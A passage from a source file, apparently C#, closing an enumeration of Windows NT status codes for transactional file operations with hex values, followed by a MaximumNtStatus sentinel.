                TransactedMappingUnsupportedRemote = 0xc0190040,
                TxfMetadataAlreadyPresent = 0xc0190041,
                TransactionScopeCallbacksNotSet = 0xc0190042,
                TransactionRequiredPromotion = 0xc0190043,
                CannotExecuteFileInTransaction = 0xc0190044,
                TransactionsNotFrozen = 0xc0190045,

                MaximumNtStatus = 0xffffffff
            
        }
    }
}